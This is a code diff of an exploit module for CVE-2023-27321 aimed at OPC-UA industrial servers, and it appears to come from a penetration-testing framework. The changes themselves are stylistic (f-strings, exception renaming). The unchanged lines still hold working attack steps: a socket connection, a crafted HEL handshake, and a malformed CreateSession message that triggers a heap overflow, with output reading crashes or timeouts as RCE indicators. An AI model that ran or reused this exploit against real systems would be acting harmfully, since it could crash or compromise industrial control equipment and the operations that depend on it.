@@ -98,14 +98,14 @@ class Exploit(Exploit):
             print_info("Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-27321")
             return
 
-        print_status("[CVE-2023-27321] Targeting OPC-UA server at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2023-27321] Targeting OPC-UA server at {self.target}:{self.port} ...")
         try:
             sock = socket.socket()
             sock.settimeout(10)
             sock.connect((self.target, self.port))
 
             # Step 1: HEL (Hello)
-            endpoint_url = "opc.tcp://{}:{}".format(self.target, self.port).encode()
+            endpoint_url = f"opc.tcp://{self.target}:{self.port}".encode()
             ep_len = struct.pack("<I", len(endpoint_url))
             hel_data = (
                 struct.pack("<I", 0)        # ProtocolVersion
@@ -140,22 +140,22 @@ class Exploit(Exploit):
             # MSG chunk header
             msg = b"MSGF" + struct.pack("<I", 8 + len(create_session)) + create_session
 
-            print_status("[CVE-2023-27321] Sending malformed CreateSession ({} bytes) ...".format(len(msg)))
+            print_status(f"[CVE-2023-27321] Sending malformed CreateSession ({len(msg)} bytes) ...")
             sock.sendall(msg)
 
             import time; time.sleep(0.5)
             try:
                 resp = sock.recv(512)
                 if resp:
-                    print_success("[CVE-2023-27321] Response received — heap overflow may have executed ({} bytes)".format(len(resp)))
+                    print_success(f"[CVE-2023-27321] Response received — heap overflow may have executed ({len(resp)} bytes)")
                 else:
                     print_success("[CVE-2023-27321] No response after overflow — server may have crashed (RCE indicator)")
-            except socket.timeout:
+            except TimeoutError:
                 print_success("[CVE-2023-27321] Timeout after overflow — heap corruption likely triggered")
         except ConnectionRefusedError:
-            print_warning("[CVE-2023-27321] Port {} refused — OPC-UA server not running".format(self.port))
+            print_warning(f"[CVE-2023-27321] Port {self.port} refused — OPC-UA server not running")
         except Exception as exc:
-            print_error("[CVE-2023-27321] Error: {}".format(exc))
+            print_error(f"[CVE-2023-27321] Error: {exc}")
         finally:
             try:
                 sock.close()
